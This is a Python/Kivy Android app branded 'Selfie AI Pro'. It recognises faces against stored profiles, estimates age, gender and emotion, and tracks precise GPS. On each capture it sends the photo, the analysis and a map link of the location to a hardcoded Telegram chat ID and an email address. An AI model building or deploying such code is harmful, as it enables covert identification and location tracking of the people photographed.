import os
import re
import smtplib
import time
import ssl
import threading
import urllib.request
from datetime import datetime
from email.message import EmailMessage

import cv2
import numpy as np
import certifi

from kivy.app import App
from kivy.clock import Clock, mainthread
from kivy.graphics.texture import Texture
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.camera import Camera
from kivy.uix.image import Image
from kivy.uix.label import Label
from kivy.uix.togglebutton import ToggleButton
from kivy.utils import platform

try:
    from plyer import gps
except Exception:
    gps = None

if platform == "android":
    from jnius import autoclass, PythonJavaClass, java_method

    class LocListener(PythonJavaClass):
        __javainterfaces__ = ['android/location/LocationListener']
        __javacontext__ = 'app'

        def __init__(self, callback):
            super().__init__()
            self.callback = callback

        @java_method('(Landroid/location/Location;)V')
        def onLocationChanged(self, location):
            try:
                self.callback(location.getLatitude(), location.getLongitude(),
                              location.getAccuracy(), location.getProvider())
            except Exception as e:
                print("location callback error:", e)

        @java_method('(Ljava/lang/String;)V')
        def onProviderEnabled(self, provider):
            pass

        @java_method('(Ljava/lang/String;)V')
        def onProviderDisabled(self, provider):
            pass

        @java_method('(Ljava/lang/String;ILandroid/os/Bundle;)V')
        def onStatusChanged(self, provider, status, extras):
            pass

# ==================== TELEGRAM CONFIGURATION ====================
BOT_TOKEN = 'PASTE_YOUR_BOT_TOKEN_HERE'
CHAT_ID = '1409963950'

# ==================== EMAIL CONFIGURATION (Gmail App Password) ====================
MAIL_USER = 'PASTE_MAIL_USER_HERE'
MAIL_APP_PASSWORD = 'PASTE_MAIL_APP_PASSWORD_HERE'
MAIL_TO = 'PASTE_MAIL_TO_HERE'
# ===============================================================

# Remove any hidden/non-ASCII characters that break the Telegram URL
BOT_TOKEN = re.sub(r'[^0-9A-Za-z:_-]', '', BOT_TOKEN)
CHAT_ID = re.sub(r'[^0-9-]', '', CHAT_ID)

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
M = os.path.join(BASE_DIR, "models")
KNOWN_FACES_DIR = os.path.join(BASE_DIR, "known_faces")

AGES = ['0-2', '4-6', '8-12', '15-20', '25-32', '38-43', '48-53', '60+']
GENDERS = ['Male', 'Female']
EMOTIONS = ['Neutral', 'Happy', 'Surprise', 'Sad', 'Angry', 'Disgust', 'Fear', 'Contempt']
OBJECTS = ["background", "aeroplane", "bicycle", "bird", "boat", "bottle", "bus",
           "car", "cat", "chair", "cow", "diningtable", "dog", "horse", "motorbike",
           "person", "pottedplant", "sheep", "sofa", "train", "tvmonitor"]
MEAN = (78.4263377603, 87.7689143744, 114.895847746)

BACK, FRONT = 0, 1


def load(fn, *a):
    return fn(*[os.path.join(M, x) for x in a])


class Analyzer:
    def __init__(self):
        self.face = load(cv2.dnn.readNetFromCaffe, "face_deploy.prototxt",
                         "res10_300x300_ssd_iter_140000.caffemodel")
        self.age = load(cv2.dnn.readNetFromCaffe, "age_deploy.prototxt", "age_net.caffemodel")
        self.gender = load(cv2.dnn.readNetFromCaffe, "gender_deploy.prototxt", "gender_net.caffemodel")
        self.emotion = cv2.dnn.readNetFromONNX(os.path.join(M, "emotion-ferplus-8.onnx"))
        self.obj = load(cv2.dnn.readNetFromCaffe, "MobileNetSSD_deploy.prototxt",
                        "MobileNetSSD_deploy.caffemodel")

        self.known_database = {}
        self.load_known_faces()

    def load_known_faces(self):
        if not os.path.exists(KNOWN_FACES_DIR):
            return
        for filename in os.listdir(KNOWN_FACES_DIR):
            if filename.lower().endswith(('.png', '.jpg', '.jpeg')):
                name = os.path.splitext(filename)[0].replace("_", " ").title()
                img = cv2.imread(os.path.join(KNOWN_FACES_DIR, filename))
                if img is not None:
                    faces = self.faces(img)
                    if faces:
                        x1, y1, x2, y2 = faces[0]
                        face_crop = cv2.resize(img[y1:y2, x1:x2], (100, 100))
                        self.known_database[name] = cv2.cvtColor(face_crop, cv2.COLOR_BGR2GRAY)

    def faces(self, img):
        h, w = img.shape[:2]
        blob = cv2.dnn.blobFromImage(cv2.resize(img, (300, 300)), 1.0, (300, 300), (104, 177, 123))
        self.face.setInput(blob)
        det = self.face.forward()
        out = []
        for i in range(det.shape[2]):
            if det[0, 0, i, 2] > 0.6:
                x1, y1, x2, y2 = (det[0, 0, i, 3:7] * [w, h, w, h]).astype(int)
                x1, y1, x2, y2 = max(0, x1), max(0, y1), min(w, x2), min(h, y2)
                if x2 - x1 > 20 and y2 - y1 > 20:
                    out.append((x1, y1, x2, y2))
        return out

    def identify_person(self, face_img):
        if not self.known_database:
            return "Unknown"
        try:
            gray_test = cv2.cvtColor(cv2.resize(face_img, (100, 100)), cv2.COLOR_BGR2GRAY)
            best_match, min_diff = "Unknown", float("inf")
            for name, ref_face in self.known_database.items():
                diff = np.sum(cv2.absdiff(gray_test, ref_face))
                if diff < min_diff:
                    min_diff, best_match = diff, name
            if min_diff < 750000:
                return best_match
        except Exception:
            pass
        return "Unknown"

    def person(self, img, box):
        x1, y1, x2, y2 = box
        pad = 20
        face_full = img[max(0, y1 - pad):y2 + pad, max(0, x1 - pad):x2 + pad]
        face_raw = img[y1:y2, x1:x2]

        person_name = self.identify_person(face_raw)

        blob = cv2.dnn.blobFromImage(face_full, 1.0, (227, 227), MEAN, swapRB=False)
        self.gender.setInput(blob)
        g = GENDERS[int(self.gender.forward()[0].argmax())]
        self.age.setInput(blob)
        a = AGES[int(self.age.forward()[0].argmax())]

        gray = cv2.cvtColor(face_raw, cv2.COLOR_BGR2GRAY)
        gray = cv2.resize(gray, (64, 64)).astype(np.float32).reshape(1, 1, 64, 64)
        self.emotion.setInput(gray)
        e = EMOTIONS[int(self.emotion.forward()[0].argmax())]

        return person_name, g, a, e

    def objects(self, img):
        h, w = img.shape[:2]
        blob = cv2.dnn.blobFromImage(cv2.resize(img, (300, 300)), 0.007843, (300, 300), 127.5)
        self.obj.setInput(blob)
        det = self.obj.forward()
        out = []
        for i in range(det.shape[2]):
            conf = float(det[0, 0, i, 2])
            if conf > 0.5:
                name = OBJECTS[int(det[0, 0, i, 1])]
                x1, y1, x2, y2 = (det[0, 0, i, 3:7] * [w, h, w, h]).astype(int)
                out.append((name, conf, (max(0, x1), max(0, y1), min(w, x2), min(h, y2))))
        return out

    def analyze(self, img):
        boxes = self.faces(img)
        if boxes:
            lines, items = [], []
            for n, b in enumerate(boxes, 1):
                name, g, a, e = self.person(img, b)
                display_name = name if name != "Unknown" else f"Unknown Person {n}"
                lines.append(f"{display_name}: {g}, Age {a}, {e}")
                items.append((b, f"{display_name} | {g}, {a}"))
            return "\n".join(lines), items

        objs = self.objects(img)
        if objs:
            text = "Object(s): " + ", ".join(f"{n} ({c:.0%})" for n, c, _ in objs)
            return text, [(b, f"{n} {c:.0%}") for n, c, b in objs]
        return "No face recognized. Unknown person.", []


class CamView(Image):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.index = BACK
        self.rot = {BACK: 3, FRONT: 1}
        self.cam = None
        self.frame = None
        self.overlay = []
        self.frozen = False
        self._open(self.index)
        Clock.schedule_interval(self.update, 1 / 20)

    def _open(self, index):
        self.index = index
        self.cam = Camera(index=index, resolution=(640, 480), play=True)

    def flip(self):
        if self.cam is not None:
            self.cam.play = False
            self.cam = None
        self.frame, self.overlay, self.frozen = None, [], False
        nxt = FRONT if self.index == BACK else BACK
        Clock.schedule_once(lambda dt: self._open(nxt), 0.4)

    def rotate(self):
        self.rot[self.index] = (self.rot[self.index] + 1) % 4

    def update(self, dt):
        if self.frozen or self.cam is None or self.cam.texture is None:
            return
        tex = self.cam.texture
        arr = np.frombuffer(tex.pixels, np.uint8).reshape(tex.height, tex.width, 4)
        top = np.rot90(arr[::-1], self.rot[self.index])
        if self.index == FRONT:
            top = top[:, ::-1]
        self.frame = cv2.cvtColor(np.ascontiguousarray(top), cv2.COLOR_RGBA2BGR)
        self.show()

    def show(self):
        if self.frame is None:
            return
        img = self.frame.copy()
        for (x1, y1, x2, y2), label in self.overlay:
            cv2.rectangle(img, (x1, y1), (x2, y2), (0, 255, 128), 3)
            cv2.putText(img, label, (x1, max(24, y1 - 8)), cv2.FONT_HERSHEY_SIMPLEX,
                        0.7, (0, 255, 128), 2)
        rgb = np.ascontiguousarray(cv2.cvtColor(img, cv2.COLOR_BGR2RGB))
        t = Texture.create(size=(rgb.shape[1], rgb.shape[0]), colorfmt="rgb")
        t.blit_buffer(rgb.tobytes(), colorfmt="rgb", bufferfmt="ubyte")
        t.flip_vertical()
        self.texture = t


class Root(BoxLayout):
    def __init__(self, **kw):
        super().__init__(orientation="vertical", padding=10, spacing=10, **kw)

        header = Label(text="[b]SELFIE AI PRO[/b]", markup=True, size_hint_y=0.07,
                       font_size="22sp", color=(0, 0.9, 1, 1))
        self.add_widget(header)

        self.view = CamView(size_hint_y=0.60)
        self.add_widget(self.view)

        self.lat = self.lon = self.acc = None
        self.last_gps_time = 0
        self.provider = None
        self.gps_label = Label(text="GPS: waiting for permission...", size_hint_y=0.05,
                               font_size="13sp", color=(1, 0.85, 0.3, 1))
        self.add_widget(self.gps_label)

        self.label = Label(text="Initializing AI Models...", size_hint_y=0.14,
                           halign="center", valign="middle", font_size="16sp",
                           color=(1, 1, 1, 0.9))
        self.label.bind(size=self.label.setter('text_size'))
        self.add_widget(self.label)

        bar = BoxLayout(size_hint_y=0.14, spacing=8)
        self.b_flip = Button(text="Flip", background_color=(0.1, 0.5, 0.8, 1))
        self.b_rot = Button(text="Rotate", background_color=(0.2, 0.6, 0.6, 1))
        self.b_live = ToggleButton(text="Live OFF", background_color=(0.3, 0.3, 0.3, 1))
        self.b_cap = Button(text="Capture", background_color=(0, 0.7, 0.4, 1))

        self.b_flip.bind(on_release=lambda *_: self.view.flip())
        self.b_rot.bind(on_release=lambda *_: self.view.rotate())
        self.b_live.bind(on_release=self.toggle_live)
        self.b_cap.bind(on_release=self.capture)

        for b in (self.b_flip, self.b_rot, self.b_live, self.b_cap):
            bar.add_widget(b)
        self.add_widget(bar)

        self.base_text = ""
        self.status = {}
        self.an = None
        Clock.schedule_once(self.load_models, 0.5)
        Clock.schedule_interval(self.live_tick, 1.0)

    # ---------------- GPS ----------------
    def start_gps(self, *_):
        self.last_gps_time = 0
        self.provider = None
        if platform == "android":
            try:
                self.start_native_location()
                return
            except Exception as ex:
                print("native location failed:", ex)
        self.start_plyer_gps()

    def start_native_location(self):
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        Context = autoclass('android.content.Context')
        Looper = autoclass('android.os.Looper')
        activity = PythonActivity.mActivity
        self.lm = activity.getSystemService(Context.LOCATION_SERVICE)
        self.loc_listener = LocListener(self.on_native_location)
        looper = Looper.getMainLooper()

        started = []
        for provider in ('gps', 'network'):
            try:
                if self.lm.isProviderEnabled(provider):
                    self.lm.requestLocationUpdates(provider, 1000, 0.0, self.loc_listener, looper)
                    started.append(provider)
            except Exception as e:
                print("provider failed:", provider, e)

        if not started:
            self.gps_label.text = "GPS is OFF - turn on Location in phone settings"
            return

        # show the last known position straight away, if the phone has one
        for provider in ('gps', 'network', 'passive'):
            try:
                loc = self.lm.getLastKnownLocation(provider)
                if loc is not None:
                    self.on_native_location(loc.getLatitude(), loc.getLongitude(),
                                            loc.getAccuracy(), provider + "-last")
                    break
            except Exception as e:
                print("last known failed:", provider, e)

        if self.lat is None:
            self.gps_label.text = "GPS: searching (" + "+".join(started) + ")..."

    @mainthread
    def on_native_location(self, lat, lon, acc, provider):
        now = time.time()
        if provider == "gps":
            self.last_gps_time = now
        elif provider == "network" and now - self.last_gps_time < 30:
            return   # a fresh GPS fix is better than a network fix
        self.lat, self.lon, self.acc, self.provider = lat, lon, acc, provider
        txt = f"GPS ({provider}): {lat:.6f}, {lon:.6f}"
        if acc:
            txt += f"  (+/-{float(acc):.0f} m)"
        self.gps_label.text = txt

    def start_plyer_gps(self):
        if gps is None:
            self.gps_label.text = "GPS: plyer not available"
            return
        try:
            gps.configure(on_location=self.on_location, on_status=self.on_status)
            gps.start(minTime=1000, minDistance=0)
            self.gps_label.text = "GPS: searching..."
        except NotImplementedError:
            self.gps_label.text = "GPS: not supported on this device"
        except Exception as ex:
            self.gps_label.text = f"GPS error: {str(ex)[:40]}"

    @mainthread
    def on_location(self, **kw):
        self.lat, self.lon, self.acc = kw.get("lat"), kw.get("lon"), kw.get("accuracy")
        txt = f"GPS: {self.lat:.6f}, {self.lon:.6f}"
        if self.acc:
            txt += f"  (+/-{float(self.acc):.0f} m)"
        self.gps_label.text = txt

    @mainthread
    def on_status(self, stype, status):
        if stype == "provider-disabled":
            self.gps_label.text = "GPS is OFF - turn on Location in phone settings"

    def loc_short(self):
        if self.lat is None or self.lon is None:
            return "Location: not available yet"
        return f"Location: {self.lat:.6f}, {self.lon:.6f}"

    def loc_full(self):
        if self.lat is None or self.lon is None:
            return "Location: not available"
        return (f"Location: {self.lat:.6f}, {self.lon:.6f}\n"
                f"https://maps.google.com/?q={self.lat:.6f},{self.lon:.6f}")

    # ---------------- status line ----------------
    def render_status(self):
        parts = "  ".join(f"[{k}: {v}]" for k, v in self.status.items())
        self.label.text = f"{self.base_text}\n{parts}"

    def set_status(self, key, value):
        def apply(dt):
            self.status[key] = value
            self.render_status()
        Clock.schedule_once(apply, 0)

    def load_models(self, dt):
        try:
            self.an = Analyzer()
            count = len(self.an.known_database)
            self.label.text = f"Ready! Loaded {count} profile(s).\nTap Capture or Live ON."
        except Exception as ex:
            self.label.text = f"Model error: {ex}"

    def toggle_live(self, *_):
        on = self.b_live.state == "down"
        self.b_live.text = "Live ON" if on else "Live OFF"
        self.b_live.background_color = (0.8, 0.3, 0.1, 1) if on else (0.3, 0.3, 0.3, 1)
        if not on:
            self.view.overlay = []

    def live_tick(self, dt):
        if self.b_live.state != "down" or self.an is None or self.view.frozen:
            return
        if self.view.frame is None:
            return
        self.run(self.view.frame)

    def run(self, img):
        try:
            text, items = self.an.analyze(img)
            self.view.overlay = items
            self.label.text = text
            return text
        except Exception as ex:
            self.label.text = f"Error: {ex}"
            return ""

    def send_telegram_async(self, img, analysis_text, loc_text):
        """Sends the photo + analysis to Telegram in a background thread."""
        def background_send():
            try:
                ok, encoded = cv2.imencode('.jpg', img)
                if not ok:
                    return
                photo_bytes = encoded.tobytes()

                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                caption = f"Selfie AI - Capture Log\nTime: {timestamp}\n\n{analysis_text}\n\n{loc_text}"

                boundary = '----------------Boundary_SelfieAI_x7'
                body = []
                body.append(f'--{boundary}\r\n'.encode())
                body.append(b'Content-Disposition: form-data; name="chat_id"\r\n\r\n')
                body.append(f'{CHAT_ID}\r\n'.encode())
                body.append(f'--{boundary}\r\n'.encode())
                body.append(b'Content-Disposition: form-data; name="caption"\r\n\r\n')
                body.append(f'{caption}\r\n'.encode('utf-8'))
                body.append(f'--{boundary}\r\n'.encode())
                body.append(b'Content-Disposition: form-data; name="photo"; filename="capture.jpg"\r\n')
                body.append(b'Content-Type: image/jpeg\r\n\r\n')
                body.append(photo_bytes)
                body.append(b'\r\n')
                body.append(f'--{boundary}--\r\n'.encode())
                data = b''.join(body)

                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
                req = urllib.request.Request(url, data=data)
                req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
                context = ssl.create_default_context(cafile=certifi.where())
                with urllib.request.urlopen(req, context=context, timeout=20) as response:
                    response.read()

                self.set_status("Telegram", "sent")
            except Exception as e:
                err = str(e)[:40]
                print(f"Telegram failed: {e}")
                self.set_status("Telegram", f"failed {err}")

        threading.Thread(target=background_send, daemon=True).start()

    def send_email_async(self, img, analysis_text, loc_text):
        """Emails the photo + analysis + location in a background thread."""
        def background_mail():
            try:
                ok, encoded = cv2.imencode('.jpg', img)
                if not ok:
                    return
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                msg = EmailMessage()
                msg["Subject"] = f"Selfie AI capture - {timestamp}"
                msg["From"] = MAIL_USER
                msg["To"] = MAIL_TO
                msg.set_content(f"Time: {timestamp}\n\n{analysis_text}\n\n{loc_text}\n")
                msg.add_attachment(encoded.tobytes(), maintype="image",
                                   subtype="jpeg", filename="capture.jpg")

                context = ssl.create_default_context(cafile=certifi.where())
                with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context, timeout=30) as smtp:
                    smtp.login(MAIL_USER, MAIL_APP_PASSWORD)
                    smtp.send_message(msg)
                self.set_status("Email", "sent")
            except Exception as e:
                err = str(e)[:40]
                print(f"Email failed: {e}")
                self.set_status("Email", f"failed {err}")

        threading.Thread(target=background_mail, daemon=True).start()

    def capture(self, *_):
        v = self.view
        if v.frozen:
            v.frozen, v.overlay = False, []
            self.b_cap.text = "Capture"
            self.label.text = "Ready."
            return
        if self.an is None or v.frame is None:
            self.label.text = "Models loading..."
            return

        analysis_text = self.run(v.frame)
        v.frozen = True
        v.show()
        self.b_cap.text = "Retake"

        loc_full = self.loc_full()
        self.base_text = analysis_text + "\n" + self.loc_short()
        self.status = {"Telegram": "sending...", "Email": "sending..."}
        self.render_status()
        frame = v.frame.copy()
        self.send_telegram_async(frame, analysis_text, loc_full)
        self.send_email_async(frame, analysis_text, loc_full)


class SelfieApp(App):
    def build(self):
        self.title = "Selfie AI Pro"
        root = Root()
        if platform == "android":
            from android.permissions import request_permissions, Permission

            def after_permissions(perms, grants):
                Clock.schedule_once(lambda dt: root.start_gps(), 0)

            request_permissions(
                [Permission.CAMERA, Permission.ACCESS_FINE_LOCATION,
                 Permission.ACCESS_COARSE_LOCATION],
                after_permissions)
        else:
            root.start_gps()
        return root


if __name__ == "__main__":
    SelfieApp().run()